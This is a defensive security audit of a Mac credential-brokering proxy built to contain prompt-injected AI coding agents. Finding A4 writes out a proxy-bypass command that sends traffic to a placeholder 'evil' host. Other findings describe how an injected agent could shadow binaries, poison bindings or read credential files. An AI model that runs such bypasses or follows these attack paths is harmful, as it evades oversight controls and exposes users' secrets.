# Security audit — AVP for Mac

> Threat model: Shai-Hulud-class worms, prompt-injected agents with full code-execution as the GUI user, supply-chain-compromised npm/pip/brew packages, and determined adversaries who will specifically target this project once it's known. The user is non-technical and trusts the tool. **Maximum-paranoia commitment: drop it on a laptop and it's a black hole; only sudo gets in.**

> This document is the standing security audit for the AVP-for-Mac distribution. It's reviewed before every release. Findings are ranked CRITICAL / HIGH / MED / LOW × Exploitability. Mitigations point at the ADR or design surface that addresses them.

Audit run: 2026-06-02. RedTeam-v2 (25 attacks) + Research-derived enforcement gaps (G1-G9, see ARCHITECTURE.md) + Oracle (unavailable — codex auth expired, OpenAI fallback returned empty; re-attempt after re-auth).

---

## P0 / CRITICAL findings

### A1 — Node native `fetch` bypasses HTTPS_PROXY without `NODE_USE_ENV_PROXY=1`

**Severity: CRITICAL. Exploitability: HIGH (default install state).**

Node 22.21+ and 24.5+ ship `fetch()` that respects `HTTPS_PROXY` ONLY when `NODE_USE_ENV_PROXY=1` is set. Older Node ignores `HTTPS_PROXY` entirely from `fetch()`. **Claude-code uses native fetch for Anthropic API calls.** Without this env var, AVP is structurally bypassed at the most security-critical hop — the Anthropic API call carrying the user's session.

**Mitigation:** `avp setup` MUST write `NODE_USE_ENV_PROXY=1` to the shell env block, the LaunchAgent setenv list, the claude-code `settings.json` `env` block, and every MCP server's `env` block. `avp doctor` verifies the var is set in every relevant location. Specified in ADR-0017.

**Source:** Node.js PR #57165; claude-code bug #15684.

### A6 — Daemon code execution as `_avp` = wholesale credential theft

**Severity: CRITICAL. Exploitability: depends on daemon code quality.**

`_avp` reads the BWS access token and (transitively) every brokered credential. RCE inside the AVP daemon process is the same as RCE on every API key the daemon brokers.

**Mitigations:**
- Upstream daemon's `--require-hashes` lockfile discipline (AGENTS.md hard constraint #5) is the supply-chain gate at the dependency layer.
- Pin to specific `mitmproxy` / `jinja2` / `pyyaml` versions; use `safe_load` only for YAML; `SandboxedEnvironment` only for Jinja2 (already in upstream).
- Run the daemon under macOS `sandbox-exec` profile as a v0.2 hardening (deferred, but flagged here so future-us doesn't forget the threat).
- `avp doctor` checks for unexpected processes running as `_avp` (only the daemon's PID should match).
- LaunchDaemon plist uses `LimitLoadToSessionType: System` and `ProcessType: Background` to constrain.

### A15 — YAML / Jinja2 parser RCE via malicious BWS notes field

**Severity: CRITICAL if exploitable. Exploitability: depends on parser configuration.**

The daemon parses YAML from BWS secret notes and (for composite bindings) Jinja2 templates. If `yaml.unsafe_load` is ever used, a malicious binding can execute Python in the daemon process (= A6). If Jinja2 uses the default `Environment` (not `SandboxedEnvironment`), template injection can do the same.

**Mitigations:**
- Daemon repo MUST use `yaml.safe_load` exclusively. CI bans `yaml.load(` (without `safe_`) and `yaml.unsafe_load` via grep gate.
- Daemon repo MUST use `jinja2.sandbox.SandboxedEnvironment` for all template rendering. CI bans bare `jinja2.Environment(`.
- The composite binding pattern in `bindings.example.yaml` uses `!unsafe` — confirm this still routes through SandboxedEnvironment, not bare eval.

**Cross-ref:** This belongs in the daemon repo's own AGENTS.md / hard constraints, not just here. Flag for upstream propagation.

---

## P1 / HIGH findings

### A2 — claude-code `settings.json` `env` block silently dropped

**Severity: HIGH. Exploitability: HIGH (default behavior on affected builds).**

Anthropic's official docs say the `env` block in `settings.json` works; six tracked bugs (#10458, #11660, #22512, #22004, #15684, #28942) report it silently drops `NODE_EXTRA_CA_CERTS`, `HTTPS_PROXY`, and other vars on various code paths. A user relying solely on `settings.json` will have non-deterministic AVP coverage.

**Mitigation:** Belt-and-suspenders — `avp setup` writes the env block in BOTH `~/.zshenv` (shell layer) AND `~/.claude/settings.json` `env` (claude-code layer) AND the LaunchAgent (launchd setenv). `avp doctor` runs `claude --print-env` (or equivalent introspection) to confirm the vars are actually set in the running claude-code's process env.

### A3 — MCP server `env` non-inheritance

**Severity: HIGH. Exploitability: HIGH for any user who adds MCP servers.**

Stdio MCP servers DO NOT inherit `HTTPS_PROXY` / `NODE_EXTRA_CA_CERTS` from claude-code's env. Each MCP server's config in `~/.claude.json` (user-scoped) and `.mcp.json` (project-scoped) needs its OWN `env` block populated. Otherwise every MCP a user adds bypasses AVP.

**Mitigation:** `avp setup` walks every `mcpServers.*` entry in user and project config files, injects the AVP env block into each `env`. `avp doctor --mcp` enumerates every MCP server config and confirms the env is present. A new `avp integrate mcp <config-path>` verb re-runs the walk after a user adds a server. Specified in ADR-0017.

**Source:** MCP spec § Debugging (modelcontextprotocol.io/docs/tools/debugging); claude-code bugs #1254, #2065, #28942.

### A4 — `unset HTTPS_PROXY` bypass without `pf` enforcement

**Severity: HIGH. Exploitability: HIGH for a prompt-injected agent.**

A determined agent can `unset HTTPS_PROXY; curl --noproxy '*' https://evil/...` to bypass the env var entirely. Without firewall-layer enforcement, AVP is policy only.

**Mitigation:** `avp lockdown` (new verb per ADR-0017) installs a `pf` anchor that drops outbound TCP/443 except to AVP's listen port and AVP daemon's own egress. Opt-in for v0.1 (high blast radius if misconfigured), recommended for dedicated-Mac-Mini deployments.

### A5 — PATH manipulation against `avp` binary

**Severity: HIGH. Exploitability: MED (user PATH typically root-owned dirs first, but installable hazard).**

If a malicious dir appears earlier in `$PATH` than `/opt/homebrew/bin`, the agent can shadow `avp` with a fake binary that lies in `doctor`, captures the BWS token entry during `setup`, or proxies sudo prompts.

**Mitigations:**
- `avp setup` ensures `/opt/homebrew/bin` (Apple Silicon) or `/usr/local/bin` (Intel) appears in `$PATH` BEFORE any user-writable dir.
- Sudoers drop-in's `Cmnd_Alias AVP_CMNDS` enumerates absolute paths, so `sudo avp ...` ALWAYS resolves to the brew-installed binary regardless of `$PATH`.
- `avp doctor` checks `which -a avp` and flags shadowing.
- Document: do not put `.` or user-writable dirs early in PATH.

### A7 — Compromised BWS workspace member adds malicious host to binding

**Severity: HIGH. Exploitability: MED (requires BWS workspace write access).**

A compromised BWS workspace member can edit the notes field of an existing secret to add `host: api.attacker.com` to the binding's scope. Within the 5-min BWS cache TTL, AVP starts brokering credentials to the attacker host.

**Mitigation:** `avp` maintains a local trust-store of last-known binding scopes per secret. New hosts on existing bindings REQUIRE the user's type-to-confirm via `sudo avp bindings approve-new-host <secret> <host>` before AVP will broker to them. The 5-min cache TTL applies to the secret value but NOT to the binding scope expansion. `avp doctor` flags any binding-scope diff since last approval. Specified in ADR-0017.

### A8 — Bindings poll interval = 5-minute window of malicious config

**Severity: HIGH (when combined with A7). Exploitability: MED.**

Binding metadata changes propagate within 5 minutes (BWS cache TTL). If a malicious binding is pushed, AVP picks it up silently and starts using it. No second confirmation at fetch time.

**Mitigation:** A7's local trust-store mechanism inverts this — bindings are pulled from BWS but APPLIED only when scope matches the previously-approved version. Scope diffs require explicit human approval. The cache TTL still controls SECRET-VALUE refresh (rotation works); only scope-mutation requires the human gate.

### A10 — Malicious replacement of `avp` binary lies in doctor

**Severity: HIGH. Exploitability: MED (requires root for binary replacement; lower bar for user-writable shadowing).**

If anything ever lands a tampered `avp` binary at the install path, `avp doctor` itself could lie about the system's health, hiding compromise.

**Mitigation:** `avp doctor --self-test` shells to `brew verify agent-vault-proxy` which cross-checks the install against the formula's pinned SHA256. Independent integrity verification path. Document: if `avp doctor --self-test` fails, do NOT trust other `avp` output.

### A18 — Initial BWS token entry leaks via shell history / TTY

**Severity: HIGH. Exploitability: MED (depends on shell config).**

During `avp setup`, the user pastes the BWS token. If `setup` uses `read` without `-s`, the token echoes to the terminal. Even with `-s`, if shell history is active, the token may be captured in fc / atuin / history file.

**Mitigation:** Setup script uses `read -s` AND explicitly disables history with `set +o history` AND `unset HISTFILE` AND `HISTSIZE=0` for the entry duration. Token never appears in `$_`. Setup ALSO accepts `AVP_BWS_TOKEN` env var for unattended installs (CI / Ansible), with explicit doc that the env var should be set via `read -s ... | sudo -E avp setup` not via the shell directly. Specified in ADR-0017.

### A19 — Multi-user Mac single-user installs are partial

**Severity: HIGH. Exploitability: LOW (assumes multi-user box).**

`avp setup` patches the running user's shell rc + LaunchAgent. Other GUI users on the same Mac are not protected; their agents talk direct.

**Mitigation:** v0.1 explicitly scopes to single-user installs. `avp doctor` detects multiple GUI users (`dscl . -list /Users | wc -l` filtered for human users) and refuses to certify the install as fully secure on a multi-user box. Multi-user support is v0.2; document scope clearly.

### A23 — Privilege escalation via `avp` sudo helper

**Severity: CRITICAL if exploitable. Exploitability: depends on helper code quality.**

`avp` shells to `sudo` for privileged operations. If the helper script has shell-interpolation injection, path traversal, or argv mishandling, the agent gets root.

**Mitigations:**
- Helper is Python with `subprocess.run(args=[...], shell=False)` exclusively. NO `shell=True` anywhere.
- All paths constructed via `pathlib.Path` with explicit allowed-prefix checks.
- All BWS values pass through `shlex.quote()` before any subprocess call.
- Helper accepts argv only; no env-var-driven control surface.
- CI grep-gate bans `shell=True` and bans `os.system`.
- Sudoers drop-in scopes by absolute path (not wildcards) to prevent path-injection circumvention.

---

## P2 / MED findings

### A9 — Root reads the BWS token at /var/lib via simple cat

**Severity: MED. Exploitability: LOW for non-root agent.**

The BWS token at `/Library/Application Support/agent-vault-proxy/bws-token` is mode 0400 _avp:_avp. Root can read it via `sudo cat`. The user can read it via `sudo cat` (since user has sudo).

**Mitigation:** This is the threat-model boundary. If root falls, all of AVP falls. The sudo password gate IS the boundary. Document.

### A11 — Older versions of AI tools ignore HTTPS_PROXY

**Severity: MED. Exploitability: depends on installed tool versions.**

- codex CLI pre-v0.93.0 ignored HTTPS_PROXY (issue #4242).
- Older Node native fetch ignores HTTPS_PROXY entirely.
- Various other tools have shipped with broken proxy support over time.

**Mitigation:** `avp doctor` checks the version of every detected AI CLI tool and warns if it predates known-fix versions. Maintained list of "known bypass versions" in the daemon repo.

### A13 — pip/npm install of attacker package as the user = filesystem read

**Severity: MED. Exploitability: HIGH (this is the everyday attack vector).**

`pip install <attacker-package>` as the user runs arbitrary code as the user → can read `~/.aws/credentials` etc. **This is out of AVP's threat model.** SandVault's domain.

**Mitigation:** Strong README direction to install SandVault alongside. The composition story is repeated at every install opportunity.

### A14 — macOS sleep/wake + LaunchAgent timing

**Severity: MED. Exploitability: LOW (timing-dependent).**

If Mac wakes from sleep and claude-code restarts before LaunchAgent re-fires setenv, there's a momentary window with no HTTPS_PROXY.

**Mitigation:** `~/.zshenv` is the primary source-of-truth for shell-launched claude; LaunchAgent is for GUI-launched. Both should fire; one being late doesn't matter if the other is in place. Document; test post-wake behavior.

### A17 — Symlink attack on sudoers Cmnd_Alias paths

**Severity: MED. Exploitability: LOW (brew owns those paths).**

The Cmnd_Alias lists `/usr/local/bin/avp` and `/opt/homebrew/bin/avp`. If those paths become symlinks to attacker-controlled binaries, sudo invokes the symlink target with the timestamp_timeout=0 rule applying.

**Mitigation:** Brew-managed paths are root-owned. User cannot replace `/opt/homebrew/bin/avp` without sudo. `avp doctor` confirms the install path is a regular file (not a symlink) and is owned by `root:admin` (homebrew convention).

### A20 — `unmatched_policy: forward_unmodified` default leaks placeholder to attacker host

**Severity: MED. Exploitability: depends on agent behavior.**

If the agent makes an HTTPS request to a host with NO binding, the upstream daemon default is `forward_unmodified` — the request goes through with the placeholder, which the attacker host receives as cleartext and can log.

The placeholder is public-knowledge so the leak itself is harmless, BUT: it confirms to the attacker that this Mac runs AVP, plus the request body / headers may leak inadvertently.

**Mitigation:** Default to `unmatched_policy: deny` on Mac brew installs. Refuse to forward requests to unmatched hosts entirely. Document; specified in ADR-0017.

### A25 — Older Node + NODE_USE_ENV_PROXY=1 silently does nothing

**Severity: MED. Exploitability: HIGH if the user has older Node.**

Setting `NODE_USE_ENV_PROXY=1` on Node <22.21 does nothing. `fetch()` still ignores `HTTPS_PROXY`. A1's mitigation is conditional on Node version.

**Mitigation:** `avp setup` checks Node version (`node --version`) and refuses to proceed if older than 22.21. Recommends `brew install node@22` or `brew upgrade node`. Documents the version floor.

---

## P3 / LOW findings

### A12 — Daemon's plugin/addon directory

If the daemon ever loads user-provided plugins (mitmproxy supports this), addon-dir writability becomes RCE-as-`_avp`. Already constrained — daemon doesn't load plugins. Document the invariant.

### A16 — Multi-tenant Jinja2 template injection in composite bindings

Already covered as part of A15. The `!unsafe` marker for `inject_template` in `bindings.example.yaml` MUST route through `SandboxedEnvironment` — confirm in upstream code.

### A21 — TOCTOU on binding fetch

Low because cache TTL is 5 min and binding changes require BWS write. Not realistically exploitable.

### A22 — Gatekeeper revocation of pipx-installed binary

Pipx-installed packages don't go through Gatekeeper. No revocation surface for us. (This was relevant only for the rejected cask + .pkg path.)

### A24 — MCP stdio proxy bypass

Covered by A3. The MCP env-injection walker in `avp setup` is the mitigation.

---

## Honest limitations (what AVP cannot defend against)

These are NOT mitigated — they're the published scope boundary of v0.1.

| Limitation | What it means | What addresses it |
|---|---|---|
| **L1 — Root falls** | If anything gets root, all of AVP falls. The sudo gate is the boundary; what's on the other side cannot be defended further | macOS's own privilege architecture; minimize root-bearing software |
| **L2 — Agent's filesystem reach** | A prompt-injected agent running as the user can read `~/.aws/credentials`, `~/.ssh/id_*`, browser data, anything in `/Users/alex/` | Compose with SandVault — repeated direction in README |
| **L3 — In-memory exfil from the daemon** | Between BWS fetch and outbound substitution, the real secret lives in the daemon's process memory for milliseconds. A heap dump of the daemon process leaks every cached secret | macOS process-isolation; `_avp` process restrictions; future v0.2 sandbox-exec wrap on the daemon |
| **L4 — BWS workspace admin compromise** | A BWS workspace admin can rewrite bindings, rotate secrets to attacker-controlled values, etc. AVP trusts BWS workspace integrity by construction | Bitwarden's own threat model; workspace audit logs; type-to-confirm on new-host additions (A7 mitigation) |
| **L5 — Apple Gatekeeper / kernel compromise** | A signed-malware exception or kernel exploit can bypass the entire macOS security model. AVP rides on macOS; if macOS falls, AVP falls | Apple's response cadence; defense-in-depth via SandVault, LuLu, Little Snitch |
| **L6 — Bash 3.2 in setup script** | macOS ships bash 3.2; new bash features unavailable. We target bash 3.2 for portability. If 3.2 has a bug we don't know about, we inherit it | Test setup script against both bash 3.2 and 5+; CI gate |

---

## Audit cadence

- **Per release:** RedTeam pass against the diff between releases.
- **Quarterly:** Full re-audit of this document. Find new attacks, retire mitigations that have stabilized, surface new known vulnerabilities.
- **Oracle review:** Re-attempt after each release. The codex-CLI auth chain is fragile; Oracle output is "nice to have", not blocking.
- **Upstream sync:** When the daemon repo's `docs/architecture.md` or `AGENTS.md` changes, re-check that ADR cross-references are still accurate.
